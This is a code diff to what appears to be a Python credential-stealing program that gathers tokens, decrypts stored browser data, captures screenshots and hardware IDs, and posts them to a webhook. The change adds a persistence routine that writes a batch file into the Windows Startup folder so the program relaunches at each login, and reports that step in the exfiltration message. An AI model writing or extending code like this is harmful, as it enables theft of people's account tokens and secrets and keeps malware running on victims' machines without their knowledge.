@@ -18,6 +18,7 @@ import platform
 import subprocess
 import pyautogui
 from io import BytesIO
+import getpass
 
 webhook_url = "{webhook_placeholder}"
 
@@ -25,6 +26,17 @@ webhook_url = "{webhook_placeholder}"
 tokens = []
 cleaned = []
 checker = []
+
+def add_to_startup():
+    try:
+        USER_NAME = getpass.getuser()
+        file_path = os.path.dirname(os.path.realpath(__file__))
+        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+        with open(bat_path + '\\' + "startup.bat", "w+") as bat_file:
+            bat_file.write(r'start "" "%s"' % file_path)
+        return "Sucessfully added to startup!"
+    except Exception as e:
+        return e
 
 def decrypt(buff, master_key):
     try:
@@ -467,7 +479,12 @@ embed = {
                     "name": "HWID",
                     "value": f'`{hwid()}`',
                     "inline": True
-                }
+                },
+                {
+                    "name": "Startup",
+                    "value": f'`{add_to_startup()}`',
+                    "inline": True
+                },
             ],
             "image": {
                 "url": "attachment://screenshot.png"
